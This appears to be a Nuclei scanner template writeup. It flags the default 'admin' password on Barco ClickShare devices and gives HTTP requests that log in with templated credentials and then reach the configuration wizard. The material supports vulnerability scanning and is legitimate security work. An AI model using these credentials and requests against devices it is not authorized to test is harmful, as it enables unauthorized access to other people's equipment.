# Nuclei Template: Barco ClickShare - Default Login
**Template ID:** barco-clickshare-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`barco-clickshare-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Barco ClickShare contains a default login vulnerability. Default login password 'admin' was found.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login/log_me_in HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrf_protection_token={{token}}&username={{username}}&password={{password}}&eula_accepted=true

GET /configuration_wizard HTTP/1.1
Host: {{Hostname}}
```

